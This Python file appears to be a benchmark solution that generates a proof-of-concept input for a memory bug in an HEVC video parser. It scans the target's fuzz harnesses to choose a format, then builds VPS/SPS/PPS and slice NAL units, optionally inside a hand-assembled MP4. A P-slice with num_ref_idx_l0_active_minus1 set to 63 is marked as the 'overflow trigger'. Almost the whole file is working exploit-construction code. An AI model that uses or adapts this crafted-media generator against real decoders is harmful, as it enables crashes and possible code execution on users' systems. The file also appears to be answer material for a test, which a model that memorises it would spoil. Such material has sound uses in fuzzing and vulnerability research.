import os
import re
import struct
import tarfile
from io import BytesIO
from typing import Optional, Tuple, List


class _BitWriter:
    __slots__ = ("_buf", "_cur", "_nbits")

    def __init__(self):
        self._buf = bytearray()
        self._cur = 0
        self._nbits = 0  # number of bits currently in _cur (0..7), MSB-first

    def write_bit(self, b: int) -> None:
        self._cur = (self._cur << 1) | (1 if b else 0)
        self._nbits += 1
        if self._nbits == 8:
            self._buf.append(self._cur & 0xFF)
            self._cur = 0
            self._nbits = 0

    def write_bits(self, n: int, v: int) -> None:
        if n <= 0:
            return
        for i in range(n - 1, -1, -1):
            self.write_bit((v >> i) & 1)

    def write_ue(self, v: int) -> None:
        if v < 0:
            v = 0
        code_num = v + 1
        bl = code_num.bit_length()
        leading_zeros = bl - 1
        for _ in range(leading_zeros):
            self.write_bit(0)
        self.write_bit(1)
        if leading_zeros:
            self.write_bits(leading_zeros, code_num - (1 << leading_zeros))

    def write_se(self, v: int) -> None:
        if v <= 0:
            ue = -2 * v
        else:
            ue = 2 * v - 1
        self.write_ue(ue)

    def rbsp_trailing_bits(self) -> None:
        self.write_bit(1)
        while self._nbits != 0:
            self.write_bit(0)

    def get_bytes(self) -> bytes:
        if self._nbits:
            self._buf.append((self._cur << (8 - self._nbits)) & 0xFF)
            self._cur = 0
            self._nbits = 0
        return bytes(self._buf)


def _rbsp_to_ebsp(rbsp: bytes) -> bytes:
    out = bytearray()
    zcount = 0
    for b in rbsp:
        if zcount >= 2 and b <= 3:
            out.append(0x03)
            zcount = 0
        out.append(b)
        if b == 0:
            zcount += 1
        else:
            zcount = 0
    return bytes(out)


def _hevc_nal_header(nal_type: int, layer_id: int = 0, tid_plus1: int = 1) -> bytes:
    nal_type &= 0x3F
    layer_id &= 0x3F
    tid_plus1 &= 0x07
    b0 = (nal_type << 1) | ((layer_id >> 5) & 0x01)
    b1 = ((layer_id & 0x1F) << 3) | tid_plus1
    return bytes((b0 & 0xFF, b1 & 0xFF))


def _profile_tier_level(bw: _BitWriter, profile_present_flag: int, max_sub_layers_minus1: int) -> None:
    if profile_present_flag:
        bw.write_bits(2, 0)  # general_profile_space
        bw.write_bits(1, 0)  # general_tier_flag
        bw.write_bits(5, 1)  # general_profile_idc
        bw.write_bits(32, 0)  # general_profile_compatibility_flags
        bw.write_bits(1, 0)  # general_progressive_source_flag
        bw.write_bits(1, 0)  # general_interlaced_source_flag
        bw.write_bits(1, 0)  # general_non_packed_constraint_flag
        bw.write_bits(1, 0)  # general_frame_only_constraint_flag
        bw.write_bits(44, 0)  # general_reserved_zero_44bits
        bw.write_bits(8, 120)  # general_level_idc
    if max_sub_layers_minus1 > 0:
        for _ in range(max_sub_layers_minus1):
            bw.write_bit(0)  # sub_layer_profile_present_flag
            bw.write_bit(0)  # sub_layer_level_present_flag
        if max_sub_layers_minus1 < 8:
            bw.write_bits(2 * (8 - max_sub_layers_minus1), 0)
        # no sub-layer profile/level data since flags are 0


def _build_vps_rbsp() -> bytes:
    bw = _BitWriter()
    bw.write_bits(4, 0)  # vps_video_parameter_set_id
    bw.write_bit(1)  # vps_base_layer_internal_flag
    bw.write_bit(1)  # vps_base_layer_available_flag
    bw.write_bits(6, 0)  # vps_max_layers_minus1
    bw.write_bits(3, 0)  # vps_max_sub_layers_minus1
    bw.write_bit(1)  # vps_temporal_id_nesting_flag
    bw.write_bits(16, 0xFFFF)  # vps_reserved_0xffff_16bits
    _profile_tier_level(bw, 1, 0)
    bw.write_bit(0)  # vps_sub_layer_ordering_info_present_flag
    # i = 0..0
    bw.write_ue(0)  # vps_max_dec_pic_buffering_minus1[0]
    bw.write_ue(0)  # vps_max_num_reorder_pics[0]
    bw.write_ue(0)  # vps_max_latency_increase_plus1[0]
    bw.write_bits(6, 0)  # vps_max_layer_id
    bw.write_ue(0)  # vps_num_layer_sets_minus1
    bw.write_bit(0)  # vps_timing_info_present_flag
    bw.write_bit(0)  # vps_extension_flag
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _build_sps_rbsp() -> bytes:
    bw = _BitWriter()
    bw.write_bits(4, 0)  # sps_video_parameter_set_id
    bw.write_bits(3, 0)  # sps_max_sub_layers_minus1
    bw.write_bit(1)  # sps_temporal_id_nesting_flag
    _profile_tier_level(bw, 1, 0)
    bw.write_ue(0)  # sps_seq_parameter_set_id
    bw.write_ue(1)  # chroma_format_idc (4:2:0)
    bw.write_ue(64)  # pic_width_in_luma_samples
    bw.write_ue(64)  # pic_height_in_luma_samples
    bw.write_bit(0)  # conformance_window_flag
    bw.write_ue(0)  # bit_depth_luma_minus8
    bw.write_ue(0)  # bit_depth_chroma_minus8
    bw.write_ue(0)  # log2_max_pic_order_cnt_lsb_minus4 (=> 4 bits)
    bw.write_bit(0)  # sps_sub_layer_ordering_info_present_flag
    # i = 0..0
    bw.write_ue(0)  # sps_max_dec_pic_buffering_minus1[0]
    bw.write_ue(0)  # sps_max_num_reorder_pics[0]
    bw.write_ue(0)  # sps_max_latency_increase_plus1[0]
    bw.write_ue(0)  # log2_min_luma_coding_block_size_minus3
    bw.write_ue(0)  # log2_diff_max_min_luma_coding_block_size
    bw.write_ue(0)  # log2_min_luma_transform_block_size_minus2
    bw.write_ue(0)  # log2_diff_max_min_luma_transform_block_size
    bw.write_ue(0)  # max_transform_hierarchy_depth_inter
    bw.write_ue(0)  # max_transform_hierarchy_depth_intra
    bw.write_bit(0)  # scaling_list_enabled_flag
    bw.write_bit(0)  # amp_enabled_flag
    bw.write_bit(0)  # sample_adaptive_offset_enabled_flag
    bw.write_bit(0)  # pcm_enabled_flag
    bw.write_ue(1)  # num_short_term_ref_pic_sets

    # short_term_ref_pic_set(0): 1 negative ref pic, used_by_curr_pic=1, delta=-1
    bw.write_ue(1)  # num_negative_pics
    bw.write_ue(0)  # num_positive_pics
    bw.write_ue(0)  # delta_poc_s0_minus1
    bw.write_bit(1)  # used_by_curr_pic_s0_flag

    bw.write_bit(0)  # long_term_ref_pics_present_flag
    bw.write_bit(0)  # sps_temporal_mvp_enabled_flag
    bw.write_bit(0)  # strong_intra_smoothing_enabled_flag
    bw.write_bit(0)  # vui_parameters_present_flag
    bw.write_bit(0)  # sps_extension_present_flag
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _build_pps_rbsp() -> bytes:
    bw = _BitWriter()
    bw.write_ue(0)  # pps_pic_parameter_set_id
    bw.write_ue(0)  # pps_seq_parameter_set_id
    bw.write_bit(0)  # dependent_slice_segments_enabled_flag
    bw.write_bit(0)  # output_flag_present_flag
    bw.write_bits(3, 0)  # num_extra_slice_header_bits
    bw.write_bit(0)  # sign_data_hiding_enabled_flag
    bw.write_bit(0)  # cabac_init_present_flag
    bw.write_ue(0)  # num_ref_idx_l0_default_active_minus1
    bw.write_ue(0)  # num_ref_idx_l1_default_active_minus1
    bw.write_se(0)  # init_qp_minus26
    bw.write_bit(0)  # constrained_intra_pred_flag
    bw.write_bit(0)  # transform_skip_enabled_flag
    bw.write_bit(0)  # cu_qp_delta_enabled_flag
    bw.write_se(0)  # pps_cb_qp_offset
    bw.write_se(0)  # pps_cr_qp_offset
    bw.write_bit(0)  # pps_slice_chroma_qp_offsets_present_flag
    bw.write_bit(0)  # weighted_pred_flag
    bw.write_bit(0)  # weighted_bipred_flag
    bw.write_bit(0)  # transquant_bypass_enabled_flag
    bw.write_bit(0)  # tiles_enabled_flag
    bw.write_bit(0)  # entropy_coding_sync_enabled_flag
    bw.write_bit(0)  # pps_loop_filter_across_slices_enabled_flag
    bw.write_bit(0)  # deblocking_filter_control_present_flag
    bw.write_bit(0)  # pps_scaling_list_data_present_flag
    bw.write_bit(0)  # lists_modification_present_flag
    bw.write_ue(0)  # log2_parallel_merge_level_minus2
    bw.write_bit(0)  # slice_segment_header_extension_present_flag
    bw.write_bit(0)  # pps_extension_present_flag
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _build_slice_rbsp_idr() -> bytes:
    bw = _BitWriter()
    bw.write_bit(1)  # first_slice_segment_in_pic_flag
    bw.write_bit(0)  # no_output_of_prior_pics_flag (IRAP)
    bw.write_ue(0)  # slice_pic_parameter_set_id
    bw.write_ue(2)  # slice_type (I)
    bw.write_ue(0)  # five_minus_max_num_merge_cand
    bw.write_se(0)  # slice_qp_delta
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _build_slice_rbsp_p_overflow(num_ref_idx_l0_active_minus1: int = 63, poc_lsb: int = 1) -> bytes:
    bw = _BitWriter()
    bw.write_bit(1)  # first_slice_segment_in_pic_flag
    bw.write_ue(0)  # slice_pic_parameter_set_id
    bw.write_ue(1)  # slice_type (P)

    # slice_pic_order_cnt_lsb: log2_max_pic_order_cnt_lsb_minus4 = 0 => 4 bits
    bw.write_bits(4, poc_lsb & 0xF)

    # not IRAP, so short_term_ref_pic_set fields present
    bw.write_bit(1)  # short_term_ref_pic_set_sps_flag (use SPS RPS 0); idx not present since num_sets=1

    bw.write_bit(1)  # num_ref_idx_active_override_flag
    bw.write_ue(int(num_ref_idx_l0_active_minus1))  # num_ref_idx_l0_active_minus1 (overflow trigger)

    bw.write_ue(0)  # five_minus_max_num_merge_cand
    bw.write_se(0)  # slice_qp_delta
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _build_annexb_stream() -> bytes:
    vps = _hevc_nal_header(32) + _rbsp_to_ebsp(_build_vps_rbsp())
    sps = _hevc_nal_header(33) + _rbsp_to_ebsp(_build_sps_rbsp())
    pps = _hevc_nal_header(34) + _rbsp_to_ebsp(_build_pps_rbsp())
    idr = _hevc_nal_header(19) + _rbsp_to_ebsp(_build_slice_rbsp_idr())
    psl = _hevc_nal_header(1) + _rbsp_to_ebsp(_build_slice_rbsp_p_overflow())

    sc = b"\x00\x00\x00\x01"
    return sc + vps + sc + sps + sc + pps + sc + idr + sc + psl


def _build_length_prefixed_nals(nals: List[bytes], nbytes: int = 4) -> bytes:
    out = bytearray()
    for nal in nals:
        if nbytes == 4:
            out += struct.pack(">I", len(nal))
        elif nbytes == 2:
            out += struct.pack(">H", len(nal))
        elif nbytes == 1:
            out += struct.pack(">B", len(nal))
        else:
            out += len(nal).to_bytes(nbytes, "big")
        out += nal
    return bytes(out)


def _mp4_box(typ: bytes, payload: bytes) -> bytes:
    return struct.pack(">I4s", 8 + len(payload), typ) + payload


def _mp4_fullbox(typ: bytes, version: int, flags: int, payload: bytes) -> bytes:
    vf = struct.pack(">I", ((version & 0xFF) << 24) | (flags & 0xFFFFFF))
    return _mp4_box(typ, vf + payload)


def _build_hvcc(vps_nal: bytes, sps_nal: bytes, pps_nal: bytes, length_size_minus_one: int = 3) -> bytes:
    # HEVCDecoderConfigurationRecord (ISO/IEC 14496-15)
    config_version = 1
    general_profile_space = 0
    general_tier_flag = 0
    general_profile_idc = 1
    general_profile_compatibility_flags = 0
    general_constraint_indicator_flags = 0
    general_level_idc = 120
    min_spatial_segmentation_idc = 0
    parallelism_type = 0
    chroma_format = 1
    bit_depth_luma_minus8 = 0
    bit_depth_chroma_minus8 = 0
    avg_frame_rate = 0
    constant_frame_rate = 0
    num_temporal_layers = 1
    temporal_id_nested = 1
    length_size_minus_one &= 3

    rec = bytearray()
    rec.append(config_version & 0xFF)
    rec.append(((general_profile_space & 3) << 6) | ((general_tier_flag & 1) << 5) | (general_profile_idc & 0x1F))
    rec += struct.pack(">I", general_profile_compatibility_flags & 0xFFFFFFFF)
    rec += (general_constraint_indicator_flags & ((1 << 48) - 1)).to_bytes(6, "big")
    rec.append(general_level_idc & 0xFF)
    rec += struct.pack(">H", 0xF000 | (min_spatial_segmentation_idc & 0x0FFF))
    rec.append(0xFC | (parallelism_type & 0x03))
    rec.append(0xFC | (chroma_format & 0x03))
    rec.append(0xF8 | (bit_depth_luma_minus8 & 0x07))
    rec.append(0xF8 | (bit_depth_chroma_minus8 & 0x07))
    rec += struct.pack(">H", avg_frame_rate & 0xFFFF)
    rec.append(((constant_frame_rate & 0x03) << 6) | ((num_temporal_layers & 0x07) << 3) | ((temporal_id_nested & 1) << 2) | (length_size_minus_one & 0x03))

    arrays = [
        (32, vps_nal),
        (33, sps_nal),
        (34, pps_nal),
    ]
    rec.append(len(arrays) & 0xFF)

    for nal_type, nal in arrays:
        rec.append(0x80 | (nal_type & 0x3F))  # array_completeness=1, reserved=0
        rec += struct.pack(">H", 1)  # numNalus
        rec += struct.pack(">H", len(nal) & 0xFFFF)
        rec += nal

    return bytes(rec)


def _build_hvc1_sample_entry(hvcc: bytes, width: int = 64, height: int = 64) -> bytes:
    # VisualSampleEntry base fields
    base = bytearray()
    base += b"\x00" * 6  # reserved
    base += struct.pack(">H", 1)  # data_reference_index
    base += struct.pack(">H", 0)  # pre_defined
    base += struct.pack(">H", 0)  # reserved
    base += struct.pack(">I", 0) * 3  # pre_defined[3]
    base += struct.pack(">H", width & 0xFFFF)
    base += struct.pack(">H", height & 0xFFFF)
    base += struct.pack(">I", 0x00480000)  # horizresolution 72 dpi
    base += struct.pack(">I", 0x00480000)  # vertresolution
    base += struct.pack(">I", 0)  # reserved
    base += struct.pack(">H", 1)  # frame_count
    base += b"\x00" * 32  # compressorname
    base += struct.pack(">H", 0x0018)  # depth
    base += struct.pack(">h", -1)  # pre_defined

    hvcc_box = _mp4_box(b"hvcC", hvcc)
    entry_payload = bytes(base) + hvcc_box
    return _mp4_box(b"hvc1", entry_payload)


def _build_minimal_mp4(sample1: bytes, sample2: bytes, vps_nal: bytes, sps_nal: bytes, pps_nal: bytes) -> bytes:
    ftyp = _mp4_box(b"ftyp", b"isom" + struct.pack(">I", 0) + b"isom" + b"iso6" + b"mp41")

    hvcc = _build_hvcc(vps_nal, sps_nal, pps_nal, length_size_minus_one=3)
    hvc1 = _build_hvc1_sample_entry(hvcc, 64, 64)

    stsd = _mp4_fullbox(b"stsd", 0, 0, struct.pack(">I", 1) + hvc1)
    stts = _mp4_fullbox(b"stts", 0, 0, struct.pack(">I", 1) + struct.pack(">II", 2, 1))
    stsc = _mp4_fullbox(b"stsc", 0, 0, struct.pack(">I", 1) + struct.pack(">III", 1, 2, 1))
    stsz = _mp4_fullbox(
        b"stsz",
        0,
        0,
        struct.pack(">II", 0, 2) + struct.pack(">II", len(sample1), len(sample2)),
    )

    def build_stco(chunk_offset: int) -> bytes:
        return _mp4_fullbox(b"stco", 0, 0, struct.pack(">I", 1) + struct.pack(">I", chunk_offset & 0xFFFFFFFF))

    stbl_placeholder = _mp4_box(b"stbl", stsd + stts + stsc + stsz + build_stco(0))

    url = _mp4_fullbox(b"url ", 0, 1, b"")
    dref = _mp4_fullbox(b"dref", 0, 0, struct.pack(">I", 1) + url)
    dinf = _mp4_box(b"dinf", dref)
    vmhd = _mp4_fullbox(b"vmhd", 0, 1, struct.pack(">H", 0) + struct.pack(">HHH", 0, 0, 0))
    minf_placeholder = _mp4_box(b"minf", vmhd + dinf + stbl_placeholder)

    mdhd = _mp4_fullbox(b"mdhd", 0, 0, struct.pack(">IIIIHH", 0, 0, 90000, 2, 0, 0))
    hdlr = _mp4_fullbox(b"hdlr", 0, 0, struct.pack(">I4s", 0, b"vide") + b"\x00" * 12 + b"VideoHandler\x00")
    mdia_placeholder = _mp4_box(b"mdia", mdhd + hdlr + minf_placeholder)

    tkhd = _mp4_fullbox(
        b"tkhd",
        0,
        0x000007,
        struct.pack(">IIIIII", 0, 0, 1, 0, 2, 0)
        + struct.pack(">II", 0, 0)
        + struct.pack(">HHHH", 0, 0, 0, 0)
        + struct.pack(">I", 0)
        + struct.pack(">9I", 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
        + struct.pack(">II", 64 << 16, 64 << 16),
    )

    trak_placeholder = _mp4_box(b"trak", tkhd + mdia_placeholder)

    mvhd = _mp4_fullbox(
        b"mvhd",
        0,
        0,
        struct.pack(">IIII", 0, 0, 90000, 2)
        + struct.pack(">I", 0x00010000)
        + struct.pack(">H", 0x0100)
        + struct.pack(">H", 0)
        + struct.pack(">II", 0, 0)
        + struct.pack(">9I", 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
        + struct.pack(">6I", 0, 0, 0, 0, 0, 0)
        + struct.pack(">I", 2),
    )

    moov_placeholder = _mp4_box(b"moov", mvhd + trak_placeholder)

    mdat_payload = sample1 + sample2
    mdat = _mp4_box(b"mdat", mdat_payload)

    # Now rebuild moov with correct stco chunk offset (moov before mdat)
    chunk_offset = len(ftyp) + len(moov_placeholder) + 8  # start of mdat payload
    stbl = _mp4_box(b"stbl", stsd + stts + stsc + stsz + build_stco(chunk_offset))
    minf = _mp4_box(b"minf", vmhd + dinf + stbl)
    mdia = _mp4_box(b"mdia", mdhd + hdlr + minf)
    trak = _mp4_box(b"trak", tkhd + mdia)
    moov = _mp4_box(b"moov", mvhd + trak)

    # moov size doesn't change (only chunk_offset value changed), but keep robust:
    chunk_offset = len(ftyp) + len(moov) + 8
    stbl = _mp4_box(b"stbl", stsd + stts + stsc + stsz + build_stco(chunk_offset))
    minf = _mp4_box(b"minf", vmhd + dinf + stbl)
    mdia = _mp4_box(b"mdia", mdhd + hdlr + minf)
    trak = _mp4_box(b"trak", tkhd + mdia)
    moov = _mp4_box(b"moov", mvhd + trak)

    return ftyp + moov + mdat


def _build_mp4_poc() -> bytes:
    vps_nal = _hevc_nal_header(32) + _rbsp_to_ebsp(_build_vps_rbsp())
    sps_nal = _hevc_nal_header(33) + _rbsp_to_ebsp(_build_sps_rbsp())
    pps_nal = _hevc_nal_header(34) + _rbsp_to_ebsp(_build_pps_rbsp())
    idr_nal = _hevc_nal_header(19) + _rbsp_to_ebsp(_build_slice_rbsp_idr())
    psl_nal = _hevc_nal_header(1) + _rbsp_to_ebsp(_build_slice_rbsp_p_overflow())

    sample1 = _build_length_prefixed_nals([vps_nal, sps_nal, pps_nal, idr_nal], 4)
    sample2 = _build_length_prefixed_nals([psl_nal], 4)

    return _build_minimal_mp4(sample1, sample2, vps_nal, sps_nal, pps_nal)


def _scan_text_in_tar(src_path: str) -> str:
    texts = []
    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name.lower()
                if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp") or name.endswith(".cxx") or name.endswith(".h")):
                    continue
                if m.size <= 0 or m.size > 2_000_000:
                    continue
                f = tf.extractfile(m)
                if not f:
                    continue
                try:
                    data = f.read()
                finally:
                    f.close()
                if b"LLVMFuzzerTestOneInput" not in data and b"HFuzzerTestOneInput" not in data:
                    continue
                try:
                    txt = data.decode("utf-8", "ignore")
                except Exception:
                    txt = data.decode("latin1", "ignore")
                texts.append(txt)
    except Exception:
        return ""
    return "\n".join(texts)


def _scan_text_in_dir(src_dir: str) -> str:
    texts = []
    for root, _, files in os.walk(src_dir):
        for fn in files:
            lfn = fn.lower()
            if not (lfn.endswith(".c") or lfn.endswith(".cc") or lfn.endswith(".cpp") or lfn.endswith(".cxx") or lfn.endswith(".h")):
                continue
            path = os.path.join(root, fn)
            try:
                st = os.stat(path)
                if st.st_size <= 0 or st.st_size > 2_000_000:
                    continue
                with open(path, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            if b"LLVMFuzzerTestOneInput" not in data and b"HFuzzerTestOneInput" not in data:
                continue
            try:
                txt = data.decode("utf-8", "ignore")
            except Exception:
                txt = data.decode("latin1", "ignore")
            texts.append(txt)
    return "\n".join(texts)


def _infer_format(src_path: str) -> str:
    combined = ""
    if os.path.isdir(src_path):
        combined = _scan_text_in_dir(src_path)
    else:
        combined = _scan_text_in_tar(src_path)

    if not combined:
        return "annexb"

    c = combined
    if re.search(r"\bgf_isom_open\b|\bgf_isom_open_memory\b|\bgf_isom\b", c):
        return "mp4"
    if re.search(r"mp4|isom|iso\s*bmff", c, re.IGNORECASE) and re.search(r"open|parse|isom", c, re.IGNORECASE):
        return "mp4"
    if re.search(r"nalu_next_start_code|next_start_code|annexb|start\s*code", c, re.IGNORECASE):
        return "annexb"
    if re.search(r"read_u32|read_u16|lengthSizeMinusOne|nal_length|nalu_length", c, re.IGNORECASE):
        # could be mp4 or raw length-prefixed; prefer mp4 only if isom not present
        return "lenpref"
    return "annexb"


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = _infer_format(src_path)
        if fmt == "mp4":
            return _build_mp4_poc()
        if fmt == "lenpref":
            vps = _hevc_nal_header(32) + _rbsp_to_ebsp(_build_vps_rbsp())
            sps = _hevc_nal_header(33) + _rbsp_to_ebsp(_build_sps_rbsp())
            pps = _hevc_nal_header(34) + _rbsp_to_ebsp(_build_pps_rbsp())
            idr = _hevc_nal_header(19) + _rbsp_to_ebsp(_build_slice_rbsp_idr())
            psl = _hevc_nal_header(1) + _rbsp_to_ebsp(_build_slice_rbsp_p_overflow())
            return _build_length_prefixed_nals([vps, sps, pps, idr, psl], 4)
        return _build_annexb_stream()